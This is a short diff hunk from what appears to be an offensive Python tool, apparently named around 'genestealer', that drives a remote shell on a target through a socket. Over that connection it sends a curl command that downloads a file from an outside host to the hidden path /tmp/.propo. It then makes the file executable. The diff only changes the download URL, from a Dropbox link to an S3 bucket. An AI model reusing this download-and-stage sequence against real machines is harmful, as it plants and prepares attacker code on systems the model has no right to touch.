@@ -139,7 +139,7 @@ def main(payload,lhost,lport,rhost):
 			"""
 			print("[-] Obtaining propo...")
 			# These links may change as we update the files
-			clientsocket.sendall("curl https://ucd0ed002c52cfa1b66540204dcf.dl.dropboxusercontent.com/cd/0/get/Av7teclquAK8imFhQfRXJ-B5Hks-kaDUK52Zlm1HkhktnoCjcedhXgFCuyitcOXv31ippojCstAR81sn4iEK9oMxSHiF5i8TqhBZLBtBjnf9nHGXa6_F-m_WCJnNrbqEWhc/file --output /tmp/.propo --silent\n".encode())
+			clientsocket.sendall("curl https://genestealer-demo.s3.amazonaws.com/propo.sh --output /tmp/.propo --silent\n".encode())
 			time.sleep(3)
 			print("[-] Changing propo file mode...")
 			clientsocket.sendall("chmod +x /tmp/.propo\n".encode())
